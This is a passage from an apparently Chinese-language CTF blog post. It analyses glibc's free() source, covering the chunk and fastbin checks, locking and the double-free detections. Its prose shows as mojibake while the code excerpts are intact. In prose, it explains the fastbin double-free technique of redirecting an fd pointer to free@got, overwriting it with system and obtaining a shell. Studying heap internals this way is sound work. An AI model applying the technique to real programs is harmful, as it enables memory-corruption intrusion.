and debug is on, it&#x27;s worth doing them.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse (p))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Note that we cannot even look at prev unless it is not inuse */</span></span><br><span class="line">      mchunkptr prv = prev_chunk (p);</span><br><span class="line">      assert (next_chunk (prv) == p);</span><br><span class="line">      do_check_free_chunk (av, prv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (next == av-&gt;top)</span><br><span class="line">    &#123;</span><br><span class="line">      assert (prev_inuse (next));</span><br><span class="line">      assert (chunksize (next) &gt;= MINSIZE);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!inuse (next))</span><br><span class="line">    do_check_free_chunk (av, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤šçš„ä¹Ÿä¸è¯´äº†ï¼Œç›¸ä¿¡éƒ½èƒ½ç†è§£çš„ï¼Œæ ¹æ®è‡ªèº«æŒ‡é’ˆå’Œè‡ªèº«å¤§å°å°±å¯ä»¥å¾ˆå®¹æ˜“çŸ¥é“ä¸‹ä¸€ä¸ª<code>chunk</code>çš„ä½ç½®ï¼Œç„¶åæ£€æµ‹ä¸€ä¸‹<code>prev_inuse</code>ä½åˆ¤æ–­æˆ‘å½“å‰<code>chunk</code>æ˜¯å¦è¢«ä½¿ç”¨ã€‚</p><h3 id="fast-binèŒƒå›´çš„å¤„ç†"><a href="#fast-binèŒƒå›´çš„å¤„ç†" class="headerlink" title="fast binèŒƒå›´çš„å¤„ç†"></a>fast binèŒƒå›´çš„å¤„ç†</h3><h4 id="fast-binçš„check"><a href="#fast-binçš„check" class="headerlink" title="fast binçš„check"></a>fast binçš„check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">    &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">        of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">        after getting the lock.  */</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">        mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">1</span>;</span><br><span class="line">        chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">        || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">        &#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! have_lock)</span><br><span class="line">        &#123;</span><br><span class="line">            (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¤§æ¡ä»¶å¾ˆæ˜æ˜¾å°±æ˜¯åˆ¤æ–­è¿™ä¸ª<code>free</code>çš„<code>chunk</code>æ˜¯å¦ä¸º<code>fast bin</code>ï¼Œåé¢åˆåˆ¤æ–­ä¸”è¿™ä¸ª<code>chunk</code>çš„åä¸€ä¸ª<code>chunk</code>ä¸ä¸º<code>top_chunk</code>ï¼Œè™½ç„¶æ ¹æ®è‡ªå·±çš„ç»éªŒå¥½åƒåˆ¤æ–­åä¸€ä¸ªä¸ä¸º<code>top_chunk</code>æ²¡ä»€ä¹ˆæ„ä¹‰ã€‚</p><p>ç„¶åæ»¡è¶³çš„è¯å°±æ˜¯ä¸€ä¸ª<code>check</code>ï¼Œåˆ¤æ–­<code>size</code>æ˜¯å¦å°äº<code>MINSIZE</code>æˆ–è€…æ˜¯<code>size&gt;=system_mem</code>ã€‚å°±æ˜¯æ’é™¤ä¸€äº›ä¸åˆç†çš„æƒ…å†µç„¶åä¼šé‡æ–°å°è¯•æ‹¿åˆ†é…å™¨çš„é”ç„¶åå†åšä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœåˆšåˆšé‚£ä¸ªæ¡ä»¶è¿˜æ˜¯æˆç«‹çš„è¯é‚£å°±è¯´æ˜<code>size</code>çœŸçš„è¢«æ”¹æˆäº†éæ³•æ•°å€¼ï¼Œé‚£å°±æŠ¥é”™é€€å‡ºã€‚</p><p>å¦‚æœè¿›æ¥äº†ä½†æ˜¯æ²¡æœ‰æ‰§è¡ŒæŠ¥é”™å‘¢ï¼Œè¯´æ˜å¯èƒ½å¤šçº¿ç¨‹æœ‰ç‚¹é—®é¢˜ï¼Œå°±é‡Šæ”¾è¿™ä¸ª<code>arena</code>çš„é”ï¼Œè¿™é‡Œæˆ‘å¤šçº¿ç¨‹ä¸æ˜¯å¾ˆå¥½ä¹Ÿä¸çŸ¥é“è¯¥å¦‚ä½•è§£é‡Šï¼Œä½†æ˜¯è¿™ä¸ªåº”è¯¥ä¸æ˜¯ä¸»è¦åˆ†æçš„ï¼Œå’±ä»¬å¹³æ—¶åšé¢˜åŸºæœ¬ä¹Ÿä¸ä¼šé‡åˆ°å¤šçº¿ç¨‹ç¼–ç¨‹çš„é¢˜ç›®ã€‚</p><h4 id="free-fast-bin"><a href="#free-fast-bin" class="headerlink" title="free fast bin"></a>free fast bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTCHUNKS_BIT        (1U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_fastchunks(M)      catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">        (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">        size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">        only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">        deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">            old_idx = fastbin_index(chunksize(old));</span><br><span class="line">        p-&gt;fd = old2 = old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ƒå…ˆæ‰§è¡Œäº†ä¸€ä¸ª<code>free_perturb</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//free_perturb</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">free_perturb</span> <span class="params">(<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®è·Ÿå‰é¢<code>malloc</code>é‚£ä¸ªå‡½æ•°å·®ä¸å¤šï¼Œå°±æ˜¯çœ‹ä½ æœ‰æ²¡æœ‰è®¾ç½®é‚£ä¸ªå€¼ï¼Œå¦‚æœè®¾ç½®äº†å°±åœ¨<code>free</code>ä¹‹å‰æŠŠå †å—è¿›è¡Œ<code>memset</code>æ¸…ç©ºï¼Œä½†æ˜¯ä¸ä¸€æ ·çš„æ˜¯ï¼Œ<code>perturb</code>ä¸­<code>memset</code>ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æ ¹æ®ä½ è®¾ç½®çš„å€¼å†å¼‚æˆ–ä¸€ä¸ª<code>0xff</code>çš„ã€‚</p><p>ç„¶åæ˜¯ç”¨<code>set_fastchunks(av)</code>å®å®šä¹‰å»åˆå§‹åŒ–<code>fast bin</code>ã€‚ä¹‹åæ ¹æ®<code>size</code>ç®—å‡ºä¸‹æ ‡æ‰¾åˆ°å¯¹åº”çš„<code>fast bin</code>ï¼Œä¹‹åå°±åº”è¯¥æŠŠè¿™ä¸ª<code>free</code>çš„<code>chunk</code>é“¾å…¥<code>fast bin</code>é‡Œé¢ã€‚è¿™é‡Œè¿˜æœ‰ä¸€ä¸ª<code>check</code>ï¼Œå¦‚æœ<code>bin</code>é¡¶éƒ¨çš„é‚£ä¸ª<code>chunk</code>å’Œè¿™æ¬¡è¦<code>free</code>çš„<code>chunk</code>ç›¸ç­‰çš„è¯ï¼Œå°±æŠ¥é”™é€€å‡ºï¼Œè¿™ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç†ŸçŸ¥çš„<code>double free</code>æ¼æ´äº†ã€‚é‚£ä¹ˆè¯´åˆ°<code>double free</code>æˆ‘ä»¬æ¥çœ‹çœ‹<code>double free</code>èƒ½é€ æˆä»€ä¹ˆåæœã€‚</p><p>å‡å¦‚æˆ‘è¦<code>free</code>çš„<code>chunk</code>æ˜¯Aï¼Œæˆ‘ç¬¬ä¸€æ¬¡<code>free</code> Aï¼Œ<code>bin</code>ä¸ºç©ºï¼Œé“¾å…¥å…¶ä¸­ï¼Œ<code>fast bin</code>ä¸­å¤šäº†ä¸€ä¸ªAã€‚ç¬¬äºŒæ¬¡<code>free</code> Aï¼ŒAå†æ¬¡è¢«åŠ å…¥<code>fast bin</code>ä¸­ï¼Œç„¶åä¼šå¯¼è‡´äº§ç”Ÿä¸€ä¸ªè‡ªå·±æŒ‡å‘è‡ªå·±çš„æŒ‡é’ˆã€‚<code>fast bin</code>ä¸­çš„æƒ…å†µå°±æ˜¯ä¸¤ä¸ªAï¼Œ<code>A-&gt;A</code>ã€‚æ­¤æ—¶æˆ‘ç”³è¯·ä¸€ä¸ªå’ŒAä¸€æ ·å¤§çš„<code>chunk</code>ï¼ŒAè¢«ç”³è¯·èµ°ï¼Œ<code>fast bin</code>ä¸­è¿˜å‰©ä¸‹ä¸€ä¸ªAï¼Œä½†æ˜¯æ­¤æ—¶ç”¨æˆ·æ‰‹é‡Œæœ‰ä¸€ä¸ªAï¼Œ<code>fast bin</code>ä¸­ä¹Ÿæœ‰ä¸€ä¸ªAã€‚ç”¨æˆ·å¯ä»¥ç›´æ¥ç¼–è¾‘Açš„æŒ‡é’ˆåŸŸï¼Œæ¯”å¦‚æˆ‘è®©å®ƒæŒ‡å‘äº†<code>got</code>è¡¨ä¸­çš„<code>free</code>å‡½æ•°ã€‚é‚£ä¹ˆæ­¤æ—¶<code>fast bin</code>ä¸­çš„æƒ…å†µå°±æ˜¯<code>A-&gt;free@got</code>ã€‚ç„¶åæˆ‘å†æ¬¡ç”³è¯·å’ŒAä¸€æ ·å¤§å°çš„<code>chunk</code>ï¼ŒAè¢«å–å‡ºæ¥ï¼Œ<code>fast bin</code>ä¸­å‰©ä¸‹<code>free@got</code>ã€‚é‚£ä¹ˆæˆ‘ç¬¬ä¸‰æ¬¡ç”³è¯·å°±å¾—åˆ°äº†åœ¨<code>free@got</code>é‚£è¾¹çš„<code>chunk</code>ï¼Œç„¶åå‡å¦‚æˆ‘å·å·ä¿®æ”¹ä¸€ä¸‹<code>free@got</code>ä¸º<code>system</code>ï¼Œé‚£å°±èƒ½è½»æ¾<code>get shell</code>äº†ã€‚è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œ<code>free@got</code>è¿™ä¸ªæŒ‡é’ˆæˆ‘æ˜¯èƒ½ä»»æ„ç¼–è¾‘çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘æƒ³ç”³è¯·åˆ°å“ªéƒ½ä¸æ˜¯é—®é¢˜ï¼Œè¿™æ ·æˆ‘å°±èƒ½ä»»æ„åœ°å€å†™äº†ã€‚</p><p>ä½ å¯èƒ½æœ‰ç‚¹ç–‘é—®ï¼Œæˆ‘<code>free</code>äº†2ä¸ªå †å—ï¼Œæ€ä¹ˆå‡ºæ¥3ä¸ªå †å—ã€‚é‚£æˆ‘ä»¬æƒ³æƒ³ï¼Œå¦‚æœéå†ä¸€ä¸ªå•é“¾è¡¨ï¼Œä½ æ€ä¹ˆåˆ¤æ–­ç»“å°¾ï¼Ÿå’±ä»¬ä¸€èˆ¬éƒ½æ˜¯åˆ¤æ–­<code>x-&gt;next!=NULL</code>ä½†æ˜¯åŸæ¥é‚£è¾¹Açš„<code>next</code>æŒ‡é’ˆç¡®å®æ˜¯<code>NULL</code>ï¼Œä½†æ˜¯ä½ æŠŠæŒ‡é’ˆæ”¹è¿‡äº†ï¼Œå°±ä¼šè®¤ä¸º<code>fast bin</code>è¿˜æ²¡æœ‰ç©ºã€‚</p><p>ä½†æ˜¯å®é™…æƒ…å†µå¾€å¾€æ²¡æœ‰é‚£ä¹ˆç®€å•ï¼Œå‰é¢æˆ‘ä»¬è¯´è¿‡äº†ï¼Œ<code>malloc</code>å–å‡ºä¸€ä¸ª<code>fast bin</code>çš„<code>chunk</code>çš„æ—¶å€™ï¼Œä¼šåˆ¤æ–­å®ƒ<code>chunk</code>çš„<code>size</code>æ˜¯å¦ç­‰äºå½“å‰æˆ‘è¦ç”³è¯·çš„<code>size</code>ï¼Œå¦‚æœä¸æ˜¯å°±ä¼šæŠ¥é”™é€€å‡ºã€‚æ‰€ä»¥<code>double free</code>åœ¨åˆ©ç”¨çš„æ—¶å€™è¿˜æ˜¯æ²¡é‚£ä¹ˆâ€ä»»æ„â€çš„ï¼Œè€Œä¸”è¿™é‡Œä¹Ÿä¸å…è®¸ä½ ç›´æ¥<code>double free</code>ï¼Œä½†æ˜¯ç›´æ¥ä¸èƒ½ä¸ä»£è¡¨ä¸èƒ½é—´æ¥<code>double free</code>ï¼Œå¦‚æœæˆ‘å…ˆ<code>free</code>ä¸€ä¸ªAï¼Œ<code>free</code>ä¸€ä¸ªBä¹‹åå†<code>free</code>ä¸€ä¸ªAï¼Œé‚£ä¹ˆæˆ‘å†ç”³è¯·åˆ°Açš„æ—¶å€™ä¿®æ”¹Açš„æŒ‡é’ˆåŸŸä¸€æ ·å¯ä»¥åŠ«æŒï¼Œå¹¶ä¸”å¯ä»¥ç»•è¿‡è¿™é‡Œçš„æ£€æµ‹ã€‚</p><p>ç„¶åå¦‚æœè¿‡äº†æ£€æµ‹ï¼Œé‚£å°±å°†è¿™ä¸ª<code>chunk</code>å‡å¦‚<code>fast bin</code>çš„é¡¶éƒ¨ã€‚è¿™é‡Œå°±æ˜¯ä¸€ä¸ªå•é“¾è¡¨çš„æ’å…¥ï¼Œå…·ä½“è‡ªå·±å†™çš„è¯åº”è¯¥æ˜¯è¿™æ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd=av-&gt;fastbinY[index]-&gt;fd;</span><br><span class="line">av-&gt;fastbinY[index]-&gt;fd=p;</span><br></pre></td></tr></table></figure><p>æºç ä¸­ä¸è¿™ä¸ªç•¥å¾®æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚æ‰€ä»¥ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªæ˜¯åè¿›å…ˆå‡ºï¼Œåªåœ¨<code>fast bin</code>çš„ä¸€ç«¯æ’å…¥åˆ é™¤ï¼Œè·Ÿæ ˆå·®ä¸å¤šã€‚</p><p>æœ«å°¾è¿˜æœ‰ä¸€ä¸ª<code>check</code>ï¼Œä½†æ˜¯è¿™ä¸ª<code>check</code>é€šå¸¸ä¸ä¼šè¢«è§¦å‘ï¼Œæœ‰ä¼šçš„å¸ˆå‚…ä¹Ÿè¯·å¸®å¸®ï¼Œå› ä¸ºæ˜¯çœŸçš„ä¸çŸ¥é“hhhã€‚</p><h4 id="freeéfast-bin"><a href="#freeéfast-bin" class="headerlink" title="freeéfast bin"></a>freeéfast bin</h4><p>è¿™é‡Œåˆ†äº†ä¸¤ç§æƒ…å†µï¼Œå¦‚æœ<code>chunk</code>æ˜¯<code>mmap</code>åˆ†é…çš„è¯é‚£å°±è°ƒç”¨<code>munmap_chunk</code>å‡½æ•°å»<code>free</code>è¿™ä¸ª<code>chunk</code>ï¼Œè¿™ä¸ªæƒ…å†µä¸å±äºæˆ‘ä»¬ä¸»è¦è¦åˆ†æçš„å†…å®¹ï¼Œæ‰€ä»¥é‚£è¾¹çš„elseåˆ†æ”¯æˆ‘ä»¬è·³è¿‡ï¼Œåªåˆ†æé<code>mmap</code>åˆ†é…çš„<code>chunk</code>ã€‚</p><h4 id="ç¬¬ä¸€éƒ¨åˆ†ï¼šé”"><a href="#ç¬¬ä¸€éƒ¨åˆ†ï¼šé”" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ†ï¼šé”"></a>ç¬¬ä¸€éƒ¨åˆ†ï¼šé”</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">    (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">    assert (locked);</span><br><span class="line">    (<span class="keyword">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æˆ‘ç†Ÿï¼Œå°±æ˜¯åœ¨ç”¨ä¸€ä¸ªåˆ†é…å™¨çš„æ—¶å€™å…ˆåŠ é”ï¼Œç”¨å®Œäº†é‡Šæ”¾å°±è¡Œäº†ã€‚è¿™ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢å¤šä¸ªçº¿ç¨‹ä¹‹é—´å‘ç”Ÿç«äº‰ï¼Œè™½ç„¶æˆ‘çœ‹è¿‡å¤šçº¿ç¨‹æ˜¯è¯´æœ‰ç‹¬ç«‹çš„å †ç©ºé—´ï¼Œä½†æ˜¯å‡è®¾å †å—æ­£å¸¸ä½¿ç”¨ï¼Œæ­£å¸¸åˆ†é…ï¼Œä¸å»åšæŒ‡é’ˆçš„è¶Šç•Œæ“ä½œï¼Œé‚£ä¹ˆåŒä¸€ä¸ªåˆ†é…å™¨åˆ†é…ç»™ä¸åŒçš„çº¿ç¨‹ç”¨ä¹Ÿæ˜¯å®Œå…¨å¯è¡Œçš„ï¼Œæˆ‘åªæ‹¿åˆ°æˆ‘è‡ªå·±ç”¨çš„æŒ‡é’ˆåœ¨åˆæ³•èŒƒå›´å†…ç”¨ä¸€æ ·ä¸ä¼šé€ æˆç«äº‰çš„ç°è±¡ã€‚ä»¥ä¸Šå‡ºäºæˆ‘è‡ªå·±çš„å¤§èƒ†æ¨æµ‹ï¼Œå¦‚æœ‰ä¸å¯¹è¿˜è¯·æŒ‡æ­£ã€‚</p><h4 id="ç¬¬äºŒéƒ¨åˆ†ï¼šfreeä¹‹å‰çš„å„ç§check"><a href="#ç¬¬äºŒéƒ¨åˆ†ï¼šfreeä¹‹å‰çš„å„ç§check" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†ï¼šfreeä¹‹å‰çš„å„ç§check"></a>ç¬¬äºŒéƒ¨åˆ†ï¼šfreeä¹‹å‰çš„å„ç§check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT     (2U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M)          (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">                      &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">                      &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<span class="comment">//åé¢å—çš„prev in useæ ‡å¿—ä½ä¸º0æ—¶å‘ç”Ÿfree</span></span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure><p>å¥½ï¼Œæˆ‘ä»¬æ¥çœ‹ç¬¬ä¸€ä¸ª<code>check</code>ã€‚</p><ol><li><code>p == av-&gt;top</code>ï¼š<code>free</code>çš„<code>chunk</code>ä¸º<code>top_chunk</code>ã€‚</li></ol><p><code>top_chunk</code>å’Œå…¶å®ƒ<code>bin</code>ä¸€æ ·ï¼Œéƒ½æ˜¯å‡ºäºå¾…åˆ†é…çŠ¶æ€ï¼Œ<code>top_chunk</code>æ°¸è¿œä¸ä¼šè¢«ä½¿ç”¨ã€‚å› ä¸ºå¦‚æœåˆ‡å‰²äº†<code>top_chunk</code>ï¼Œ<code>top_chunk</code>é©¬ä¸Šä¼šä¸‹ç§»ï¼Œæ‰€ä»¥æ­£å¸¸åˆ†é…æ˜¯ç»å¯¹ä¸ä¼šåˆ†é…åˆ°ç°åœ¨çš„<code>top_chunk</code>æŒ‡é’ˆçš„ï¼Œæ‰€ä»¥å½“ä½ å°è¯•<code>free</code> 